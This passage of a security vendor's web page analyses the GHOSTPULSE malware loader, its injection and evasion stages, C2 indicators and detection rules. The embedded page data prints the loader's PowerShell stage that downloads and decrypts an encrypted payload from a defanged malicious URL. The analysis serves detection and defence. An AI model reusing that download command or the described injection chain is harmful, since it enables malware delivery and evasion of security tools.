  void *field_108;
  void *field_110;
  void *field_118;
  void *field_120;
  void *field_128;
  void *kernel32_SetCurrentDirectoryW;
  void *field_138;
  void *kernel32_SetEnvironmentVariableW;
  void *kernel32_CreateProcessW;
  void *kernel32_GetFileAttributesW;
  void *msvcrt_malloc;
  void *msvcrt_realloc;
  void *msvcrt_free;
  void *ntdll_RtlHashUnicodeString;
  void *field_178;
  void *field_180;
  void *kernel32_OpenMutexA;
  void *field_190;
  void *kernel32_VirtualProtect;
  void *kernel32_FlushInstructionCache;
  void *field_1A8;
  void *ntdll_NtOpenProcessToken;
  void *ntdll_NtQueryInformationToken;
  void *ntdll_RtlWalkFrameChain;
  void *field_1C8;
  void *addr_temp_file_content;
  void *addr_decrypted_file;
};</code></pre>
<p>Concerning NT functions, the malware reads the ntdll.dll library from disk and writes it to a dynamically allocated memory space with read, write, and execute permissions. Subsequently, it parses the loaded <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ntdll.dll</code> library to extract the offsets of the required NT functions. These offsets are then stored within the newly built IAT structure. When the malware necessitates the execution of an NT API, it adds the API offset to the base address of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ntdll.dll</code> and directly invokes the API. Given that NT APIs operate at a very low level, they execute syscalls directly, which does not require the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ntdll.dll</code> library to be loaded in memory using the LoadLibrary API, this is done to evade userland hooks set by security products.</p>
<p>The following is the structure used by the malware to store NT API offsets:</p>
<pre><code>struct __unaligned __declspec(align(4)) core_stage2_nt_offsets_table
{
  __int64 ntdll_module;
  int ZwCreateSection;
  int ZwMapViewOfSection;
  int ZwWriteVirtualMemory;
  int ZwProtectVirtualMemory;
  int NtSuspendThread;
  int ZwResumeThread;
  int ZwOpenProcess;
  int ZwGetContextThread;
  int NtSetContextThread;
};</code></pre>
<p>GHOSTPULSE has the ability to establish persistence, if configured to, by generating an <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.lnk</code> file that points to the Stage 1 binary, denoted as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">VBoxSVC.exe</code>. To achieve this, the malware leverages COM (Component Object Model) objects as part of its technique.</p>
<p></p>
<p>It extracts another sub-blob of data from the first decrypted blob of Stage 1. This data is located at a specific position in the structure. The malware then performs an XOR encryption on this sub-blob, using the result of the XOR operation between the CRC32 value of the machine&#x27;s computer name and the constant value <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0xA1B2D3B4</code>. Finally, the encrypted data is saved to a file in the user&#x27;s temporary folder.
It extracts another sub-blob of data from the first decrypted blob of Stage 1. This data is located at a specific position in the structure. The malware then performs an XOR encryption on this sub-blob, using the result of the XOR operation between the CRC32 value of the machine&#x27;s computer name and the constant value <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0xA1B2D3B4</code>. Finally, the encrypted data is saved to a file in the user&#x27;s temporary folder.</p>
<p>The malware then initiates a suspended child process using the executable specified in the Stage 2 configuration, which is a 32-bit <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cmd.exe</code> in this case. It then adds an environment variable to the child process with a random name, example: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GFHZNIOWWLVYTESHRTGAVC</code>, pointing to the previously created temporary file.</p>
<p>Further, the malware proceeds by creating a section object and mapping a view of it to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">mshtml.dll</code> in the child process using the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ZwCreateSection</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ZwMapViewOfSection</code> APIs.</p>
<p>The legitimate <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">mshtml.dll</code> code is overwritten with the <em>WriteProcessMemory</em> API. The primary thread’s execution is then redirected to the malicious code in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">mshtml.dll</code> with the <em>Wow64SetThreadContext</em> API as shown in the following image:</p>
<p></p>
<p>The parent process promptly terminates itself.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="stage-3" class="absolute -top-32"></span>Stage 3</h3>
<p>The objective of GHOSTPULSE’s Stage 3 is to load and execute the final payload in another  process. One interesting part of Stage 3 was that it overwrites its previously executed instructions with new instructions to make analysis difficult. It is also capable of establishing persistence using the same method described above. GHOSTPULSE executes NTDLL APIs using the &quot;<a href="https://www.zdnet.com/article/malware-authors-are-still-abusing-the-heavens-gate-technique/">heaven’s gate</a>&quot; technique.</p>
<p></p>
<p>Stage 3 starts off by constructing its own Function Import Table using CRC32 as the hashing algorithm. Additionally, it has the capability to disable redirection of the file system to WOW64, achieved through the utilization of the procedure <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Wow64FsRedirection</code>, if configured to do so.</p>
<p>Following this, Stage 3 accesses the environment variable that was set earlier, in our case <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GFHZNIOWWLVYTESHRTGAVC</code>, retrieves the associated temporary file and proceeds to decrypt its contents.</p>
<p></p>
<p>The decrypted file includes both a configuration and the ultimate payload in an encrypted format. The final payload undergoes XOR decryption using a 200-byte long key stored within the configuration. The malware then parses the PE structure of the payload with a set of functions that will indicate how the payload will be injected, for example, the type of payload (DLL or executable) architecture, etc.</p>
<p></p>
<p>GHOSTPULSE employs <a href="https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack">Process Doppelgänging</a>, leveraging the NTFS transactions feature to inject the final payload into a new child process. The following steps illustrate the process:</p>
<ul>
<li>Calls the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CreateTransaction</code> API to initial a transaction</li>
<li>Creates a transaction file with a random file name in temp folder with the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ZwCreateFile</code> API</li>
<li>Writes the payload to the temp file using the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ZwWriteFile</code> API</li>
<li>Creates a section of the transaction file with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ZwCreateSection</code> API</li>
<li>At this point the file is not needed anymore, the malware calls the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RollbackTransaction</code> API to roll the transaction back</li>
<li>GHOSTPULSE creates a suspended process with the target process path taken from it&#x27;s configuration, in our sample <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">1msbuild.exe1</code></li>
<li>It maps a view of the section to the process with the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ZwMapViewOfSection</code> API</li>
<li>It sets the child process thread instruction pointer to the entry point of the final payload with the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">NtSetContextThread</code> API</li>
<li>Finally it resumes the thread with the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">NtResumeThread</code> API</li>
</ul>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="final-payload" class="absolute -top-32"></span>Final Payload</h3>
<p>The final payload varies from sample to sample but is typically an information stealer. We have observed SectopRAT, Rhadamanthys, Vidar, Lumma, and NetSupport as final payloads. In SectopRAT samples, the malware first reaches out to Pastebin to retrieve the command and control address. In this case, it was <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">195.201.198[.]179</code> over TCP port <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">15647</code> as shown below:</p>
<p></p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="configuration-extractor" class="absolute -top-32"></span>Configuration extractor</h2>
<p>Alongside this research, the Elastic Security Research Team has provided a <a href="https://github.com/elastic/labs-releases/blob/main/tools/ghostpulse/ghostpulse_payload_extractor.py">configuration extractor</a> to allow threat researchers to continue work to discover further developments within this campaign and expand detection capabilities for our community. The extractor takes the encrypted file shipped with GHOSTPULSE as the input.</p>
<p></p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="detection-guidance" class="absolute -top-32"></span>Detection Guidance</h2>
<p>Elastic Defend detects this threat with the following <a href="https://github.com/elastic/protections-artifacts/tree/main/behavior">behavior protection rules</a>:</p>
<ul>
<li>DNS Query to Suspicious Top Level Domain</li>
<li>Library Load of a File Written by a Signed Binary Proxy</li>
<li>Suspicious API Call from an Unsigned DLL</li>
<li>Suspicious Memory Write to a Remote Process</li>
<li>Process Creation from Modified NTDLL</li>
</ul>
<p>The following yara rule will also detect GHOSTPULSE loaders on disk:</p>
<ul>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_GhostPulse.yar">Windows.Trojan.GhostPulse</a></li>
</ul>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="observations" class="absolute -top-32"></span>Observations</h2>
<p>All observables are also available for <a href="https://github.com/elastic/labs-releases/tree/main/indicators/ghostpulse">download</a> in both ECS and STIX format.</p>
<p>The following observables were discussed in this research.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Observable</th><th>Type</th><th>Name</th><th>Reference</th></tr></thead><tbody><tr><td>78.24.180[.]93</td><td>ip-v4</td><td></td><td>Stage 0 C2 IP</td></tr><tr><td>manojsinghnegi[.]com</td><td>domain-name</td><td></td><td>Stage 0 C2 domain</td></tr><tr><td>manojsinghnegi[.]com/2.tar.gpg</td><td>url</td><td></td><td>Stage 0 C2 URL</td></tr><tr><td>0c01324555494c35c6bbd8babd09527bfc49a2599946f3540bb3380d7bec7a20</td><td>sha256</td><td>Chrome-x64.msix</td><td>Malicious MSIX</td></tr><tr><td>ee4c788dd4a173241b60d4830db128206dcfb68e79c68796627c6d6355c1d1b8</td><td>sha256</td><td>Brave-x64.msix</td><td>Malicious MSIX</td></tr><tr><td>4283563324c083f243cf9335662ecc9f1ae102d619302c79095240f969d9d356</td><td>sha256</td><td>Webex.msix</td><td>Malicious MSIX</td></tr><tr><td>eb2addefd7538cbd6c8eb42b70cafe82ff2a8210e885537cd94d410937681c61</td><td>sha256</td><td>new1109.ps1</td><td>PowerShell Downloader</td></tr><tr><td>49e6a11453786ef9e396a9b84aeb8632f395477abc38f1862e44427982e8c7a9</td><td>sha256</td><td>38190626900.rar</td><td>GHOSTPULSE tar archive</td></tr><tr><td>Futurity Designs Ltd</td><td>Code signer</td><td></td><td>Chrome-x64.msix code signer</td></tr><tr><td>Fodere Titanium Limited</td><td>Code signer</td><td></td><td>Brave-x64.msix code signer</td></tr><tr><td>IMPERIOUS TECHNOLOGIES LIMITED</td><td>Code signer</td><td></td><td>Webex.msix code signer</td></tr></tbody></table></div>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="references" class="absolute -top-32"></span>References</h2>
<ul>
<li><a href="https://twitter.com/1ZRR4H/status/1699923793077055821">https://twitter.com/1ZRR4H/status/1699923793077055821</a></li>
<li><a href="https://www.rapid7.com/blog/post/2023/08/31/fake-update-utilizes-new-idat-loader-to-execute-stealc-and-lumma-infostealers/">https://www.rapid7.com/blog/post/2023/08/31/fake-update-utilizes-new-idat-loader-to-execute-stealc-and-lumma-infostealers/</a></li>
<li><a href="https://www.proofpoint.com/us/blog/threat-insight/are-you-sure-your-browser-date-current-landscape-fake-browser-updates">https://www.proofpoint.com/us/blog/threat-insight/are-you-sure-your-browser-date-current-landscape-fake-browser-updates</a></li>
</ul></div></div></div><div class="hidden lg:flex lg:col-span-1 text-sm lg:flex-col lg:space-y-6"><div class="toc"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Jump to section</h4><ul class="flex flex-col space-y-2"><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks#update"><span>Update</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks#preamble"><span>Preamble</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks#malware-analysis"><span>Malware&nbsp;Analysis</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks#stage-0"><span>Stage&nbsp;0</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks#stage-1"><span>Stage&nbsp;1</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks#stage-2"><span>Stage&nbsp;2</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks#stage-3"><span>Stage&nbsp;3</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks#final-payload"><span>Final&nbsp;Payload</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks#configuration-extractor"><span>Configuration&nbsp;extractor</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks#detection-guidance"><span>Detection&nbsp;Guidance</span></a></li></ul><button class="border-t border-white/20 w-full mt-3 py-2 flex items-center space-x-1 text-xs font-medium uppercase tracking-wide hover:text-white"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="w-3 h-3"><path d="M10.75 4.75a.75.75 0 00-1.5 0v4.5h-4.5a.75.75 0 000 1.5h4.5v4.5a.75.75 0 001.5 0v-4.5h4.5a.75.75 0 000-1.5h-4.5v-4.5z"></path></svg><span>Show more</span></button></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Elastic Security Labs Newsletter</h4><div><a target="_blank" class="button inline-flex" href="https://www.elastic.co/security-labs/newsletter?utm_source=security-labs">Sign Up</a></div></div></div></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl my-5 md:my-10 max-w-3xl mx-auto flex flex-col items-center shadow-2xl"><h4 class="font-bold leading-tight text-lg md:text-2xl">Share this article</h4><div class="flex flex-wrap items-center justify-center mt-4 space-x-4"><a class="flex items-center space-x-2 button" href="https://twitter.com/intent/tweet?text=GHOSTPULSE haunts victims using defense evasion bag o&#x27; tricks&amp;url=https://www.elastic.co/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Twitter" title="Share this article on Twitter"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>Twitter</span></a><a class="flex items-center space-x-2 button" href="https://www.facebook.com/sharer/sharer.php?u=https://www.elastic.co/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Facebook" title="Share this article on Facebook"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M22.5 12c0-5.799-4.701-10.5-10.5-10.5S1.5 6.201 1.5 12c0 5.301 3.901 9.699 9 10.401V14.4h-2.7v-2.7h2.7v-2.1c0-2.7 1.8-4.2 4.2-4.2 1.2 0 2.1.1 2.4.2v2.4h-1.5c-1.2 0-1.5.6-1.5 1.5v1.8h3l-.3 2.7h-2.7V22C18.599 21.3 22.5 17.301 22.5 12z"></path></svg><span>Facebook</span></a><a class="flex items-center space-x-2 button" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.elastic.co/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks&amp;title=GHOSTPULSE haunts victims using defense evasion bag o&#x27; tricks" target="_blank" rel="noopener noreferrer" aria-label="Share this article on LinkedIn" title="Share this article on LinkedIn"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path></svg><span>LinkedIn</span></a><a class="flex items-center space-x-2 button" href="https://reddit.com/submit?url=https://www.elastic.co/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks&amp;title=GHOSTPULSE haunts victims using defense evasion bag o&#x27; tricks" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Reddit" title="Share this article on Reddit"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 12C24 18.6274 18.6274 24 12 24C5.37258 24 0 18.6274 0 12C0 5.37258 5.37258 0 12 0C18.6274 0 24 5.37258 24 12ZM19.6879 11.0584C19.8819 11.3352 19.9916 11.6622 20.004 12C20.0091 12.3306 19.9205 12.656 19.7485 12.9384C19.5765 13.2208 19.3281 13.4488 19.032 13.596C19.0455 13.7717 19.0455 13.9483 19.032 14.124C19.032 16.812 15.9 18.996 12.036 18.996C8.172 18.996 5.04 16.812 5.04 14.124C5.02649 13.9483 5.02649 13.7717 5.04 13.596C4.80919 13.49 4.6042 13.335 4.43923 13.1419C4.27427 12.9487 4.15327 12.722 4.08462 12.4775C4.01598 12.2329 4.00133 11.9764 4.04169 11.7256C4.08205 11.4748 4.17646 11.2358 4.31837 11.0251C4.46028 10.8145 4.6463 10.6372 4.86354 10.5056C5.08078 10.3739 5.32404 10.2911 5.57646 10.2629C5.82889 10.2346 6.08444 10.2616 6.32541 10.3419C6.56638 10.4222 6.78701 10.5539 6.972 10.728C8.35473 9.79023 9.98146 9.27718 11.652 9.252L12.54 5.088C12.55 5.03979 12.5694 4.99405 12.5972 4.95341C12.625 4.91277 12.6605 4.87805 12.7018 4.85127C12.7431 4.82448 12.7894 4.80615 12.8378 4.79735C12.8862 4.78855 12.9359 4.78945 12.984 4.8L15.924 5.388C16.0676 5.14132 16.2944 4.9539 16.5637 4.85937C16.833 4.76484 17.1272 4.7694 17.3934 4.87222C17.6597 4.97505 17.8806 5.1694 18.0164 5.42041C18.1523 5.67141 18.1942 5.96262 18.1348 6.24177C18.0753 6.52092 17.9182 6.76972 17.6918 6.94352C17.4654 7.11732 17.1845 7.20473 16.8995 7.19006C16.6144 7.1754 16.3439 7.05962 16.1366 6.8635C15.9292 6.66738 15.7985 6.40378 15.768 6.12L13.2 5.58L12.42 9.324C14.0702 9.3594 15.6749 9.87206 17.04 10.8C17.2839 10.566 17.5902 10.4074 17.9221 10.3436C18.254 10.2797 18.5973 10.3132 18.9106 10.4401C19.2239 10.5669 19.4939 10.7817 19.6879 11.0584ZM8.20624 12.5333C8.07438 12.7307 8.004 12.9627 8.004 13.2C8.004 13.5183 8.13043 13.8235 8.35547 14.0485C8.58051 14.2736 8.88574 14.4 9.204 14.4C9.44134 14.4 9.67335 14.3296 9.87068 14.1978C10.068 14.0659 10.2218 13.8785 10.3127 13.6592C10.4035 13.4399 10.4272 13.1987 10.3809 12.9659C10.3346 12.7331 10.2204 12.5193 10.0525 12.3515C9.8847 12.1836 9.67089 12.0694 9.43811 12.0231C9.20533 11.9768 8.96405 12.0005 8.74478 12.0913C8.52551 12.1822 8.33809 12.336 8.20624 12.5333ZM12.012 17.424C13.0771 17.4681 14.1246 17.1416 14.976 16.5V16.548C15.0075 16.5173 15.0327 16.4806 15.05 16.4402C15.0674 16.3997 15.0766 16.3563 15.0772 16.3122C15.0777 16.2682 15.0696 16.2245 15.0533 16.1837C15.0369 16.1428 15.0127 16.1055 14.982 16.074C14.9513 16.0425 14.9146 16.0173 14.8742 16C14.8337 15.9826 14.7903 15.9734 14.7462 15.9728C14.7022 15.9723 14.6585 15.9804 14.6177 15.9967C14.5768 16.0131 14.5395 16.0373 14.508 16.068C13.7797 16.5904 12.895 16.8487 12 16.8C11.1061 16.8399 10.2255 16.5732 9.504 16.044C9.44182 15.993 9.36289 15.9669 9.28256 15.9708C9.20222 15.9748 9.12622 16.0085 9.06935 16.0653C9.01247 16.1222 8.97879 16.1982 8.97484 16.2786C8.97089 16.3589 8.99697 16.4378 9.048 16.5C9.89937 17.1416 10.9469 17.4681 12.012 17.424ZM14.0933 14.2458C14.2907 14.3776 14.5227 14.448 14.76 14.448L14.748 14.496C14.9107 14.4978 15.0721 14.4664 15.2223 14.4038C15.3725 14.3413 15.5084 14.2488 15.6218 14.1321C15.7352 14.0154 15.8236 13.8768 15.8818 13.7248C15.9399 13.5728 15.9665 13.4106 15.96 13.248C15.96 13.0107 15.8896 12.7787 15.7578 12.5813C15.6259 12.384 15.4385 12.2302 15.2192 12.1393C14.9999 12.0485 14.7587 12.0248 14.5259 12.0711C14.2931 12.1174 14.0793 12.2316 13.9115 12.3995C13.7436 12.5673 13.6294 12.7811 13.5831 13.0139C13.5368 13.2467 13.5605 13.4879 13.6513 13.7072C13.7422 13.9265 13.896 14.1139 14.0933 14.2458Z" fill="currentColor"></path></svg><span>Reddit</span></a></div></div></article></main><footer class="mt-auto text-xs md:text-sm"><div class="container py-6 flex flex-col md:flex-row gap-2 md:gap-0 justify-between items-center"><div class="text-zinc-300"><nav><ul class="flex space-x-4"><li><a class="hover:text-white font-medium" href="/security-labs/sitemap.xml">Sitemap</a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://elastic.co?utm_source=elastic-search-labs&amp;utm_medium=referral&amp;utm_campaign=search-labs&amp;utm_content=footer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="inline-block w-3 h-3"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"></path></svg><span>Elastic.co</span></a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://twitter.com/elasticseclabs"><svg class="w-4 h-4 inline-block w-3 h-3" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>@elasticseclabs</span></a></li></ul></nav></div><div class="flex flex-col space-y-1 text-zinc-300"><p>© <!-- -->2024<!-- -->. Elasticsearch B.V. All Rights Reserved.</p></div></div></footer></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"article":{"title":"GHOSTPULSE haunts victims using defense evasion bag o' tricks","slug":"ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks","date":"2023-10-27","description":"Elastic Security Labs reveals details of a new campaign leveraging defense evasion capabilities to infect victims with malicious MSIX executables.","image":"photo-edited-05@2x.jpg","tags":["ghostpulse","ref8207"],"body":{"raw":"\n## Update\n\nIn October 2024, we released an update to stage 2 of GHOSTPULSE that includes new evasion techniques. You can check it out [here](https://www.elastic.co/security-labs/tricks-and-treats).\n\n## Preamble\n\nElastic Security Labs has observed a campaign to compromise users with signed [MSIX](https://learn.microsoft.com/en-us/windows/msix/overview) application packages to gain initial access. The campaign leverages a stealthy loader we call GHOSTPULSE which decrypts and injects its final payload to evade detection.\n\nMSIX is a Windows app package format that developers can leverage to package, distribute, and install their applications to Windows users. With [App Installer](https://learn.microsoft.com/en-us/windows/msix/app-installer/app-installer-root), MSIX packages can be installed with a double click. This makes them a potential target for adversaries looking to compromise unsuspecting victims. However, MSIX requires access to purchased or stolen code signing certificates making them viable to groups of above-average resources.\n\nIn a common attack scenario, we suspect the users are directed to download malicious MSIX packages through [compromised websites](https://www.proofpoint.com/us/blog/threat-insight/are-you-sure-your-browser-date-current-landscape-fake-browser-updates), search-engine optimization (SEO) techniques, or malvertising. The masquerading themes we’ve observed include installers for Chrome, Brave, Edge, Grammarly, and WebEx to highlight a few.\n\n![](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image5.png)\n\nFrom the user's perspective, the “Install” button appears to function as intended. No pop-ups or warnings are presented. However, a PowerShell script is covertly used to download, decrypt, and execute GHOSTPULSE on the system. \n\n![](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image10.jpg)\n\n## Malware Analysis\n\nThe GHOSTPULSE loader can be broken down into 3 stages (sometimes preceded by a PowerShell script) used to execute a final payload.\n\n### Stage 0\n\nWe consider the PowerShell script dropped by the malicious MSIX installer to be the stage 0 payload. The PowerShell script is typically included in MSIX infection vectors, but not always in other GHOSTPULSE infection methods (MSI, EXE, ISO). In one sample, the PowerShell script downloads a GPG-encrypted file from `manojsinghnegi[.]com/2.tar.gpg`. \n\nNext, the PowerShell script decrypts the file using the command-line GPG utility using the following parameters:\n\n- `putin` - the passphrase for the GPG file\n- `--batch` - execute GPG in non-interactive mode\n- `--yes` - answer “yes” to any prompts\n- `--passphrase-fd 0` - read the passphrase from a file descriptor, 0 instructs GPG to use STDIN, which is putin\n- `--decrypt` - decrypt a file\n- `--output` - what to save the decrypted file as\n\n```\n# 1\n$url = \"https://manojsinghnegi[.]com/2.tar.gpg\"\n$outputPath = \"$env:APPDATA\\$xxx.gpg\"\nInvoke-WebRequest -Uri $url -OutFile $outputPath\n\n# 1\necho 'putin' | .$env:APPDATA\\gpg.exe --batch --yes --passphrase-fd 0 --decrypt --output $env:APPDATA\\$xxx.rar $env:APPDATA\\$xxx.gpg\n```\n\nThe GPG utility is included in the malicious MSIX installer package.\n\nThe decrypted file is a tar archive containing an executable `VBoxSVC.exe` which is in reality a renamed signed `gup.exe` executable that is used to update Notepad++, which is vulnerable to sideloading, an encrypted file in one example `handoff.wav` and a mostly benign library `libcurl.dll` with one of its functions overwritten with malicious code. The PowerShell executes the binary `VBoxSVC.exe` that will side load from the current directory the malicious DLL `libcurl.dll`. By minimizing the on-disk footprint of encrypted malicious code, the threat actor is able to evade file-based AV and ML scanning.\n\n![File metadata of VBoxSVC.bin](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image11.png)\n\n### Stage 1\n\nThe first stage of GHOSTPULSE is embedded within a malicious DLL that undergoes side-loading through a benign executable. Execution of the corresponding code is triggered during the *DllEntryPoint* phase. \n\nThe process is initiated by pinpointing the base address of the malicious DLL of `libcurl.dll`, achieved through parsing the *InLoadOrderModuleList* API. This list, residing in the Process Environment Block (PEB), systematically records information about loaded modules.\n\n![Parsing the 